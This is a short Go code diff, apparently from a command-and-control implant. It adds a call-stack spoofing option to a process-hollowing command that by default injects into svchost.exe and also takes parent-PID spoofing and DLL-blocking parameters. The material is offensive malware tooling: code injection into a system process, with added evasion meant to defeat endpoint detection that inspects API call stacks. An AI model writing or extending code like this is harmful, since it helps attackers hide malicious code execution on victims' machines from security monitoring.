@@ -26,6 +26,7 @@ type hollowParams struct {
 	Target       string `json:"target"`
 	Ppid         int    `json:"ppid"`
 	BlockDLLs    bool   `json:"block_dlls"`
+	StackSpoof   bool   `json:"stack_spoof"`
 }
 
 // procVirtualProtectExHollow — resolved at runtime via ensureInjectionHelpers
@@ -56,6 +57,11 @@ func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
 
 	if params.Target == "" {
 		params.Target = `C:\Windows\System32\svchost.exe`
+	}
+
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	runtime.LockOSThread()
